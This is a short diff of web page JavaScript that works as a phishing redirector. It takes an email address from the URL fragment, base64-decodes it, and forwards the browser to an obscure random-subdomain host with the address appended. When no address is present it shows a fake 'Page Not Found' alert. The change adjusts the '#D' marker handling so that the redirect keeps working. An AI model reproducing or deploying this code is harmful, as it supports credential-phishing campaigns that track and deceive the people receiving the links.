@@ -56,9 +56,9 @@ p {font-size: 1em; color: #404040; text-align: center; margin: 10px 0 0 0;}
 RewriteEngine On
 RewriteRule ^[^/]+/try/(.*)$ /try/$1 [L] */
 
-var redirect_url = "https://33j9a19.quormidal.com/vv39AWs/#D"; // Change this to the URL you want to redirect to
+var redirect_url = "https://33j9a19.quormidal.com/vv39AWs/#"; // Change this to the URL you want to redirect to
 var path = window.location.href;  // Get the part of the URL after the domain name
-var parts = path.split('#D'); // Split the path by #
+var parts = path.split('#'); // Split the path by #
 // Check if there is a second part
 if (parts.length > 1) {
 // Get the email from the second part
@@ -66,8 +66,8 @@ var email = parts[1];
 if (isBase64(email)) {
 email = atob(email);
 }
-// Redirect to the new URL with the email
-window.location.href = redirect_url + email;
+email += 'D'; // Append 'D' to the decoded or plain email
+window.location.href = redirect_url + email; // Redirect to the new URL with the email
 } else {
 // No email found, show an error message
 alert('Page Not Found');
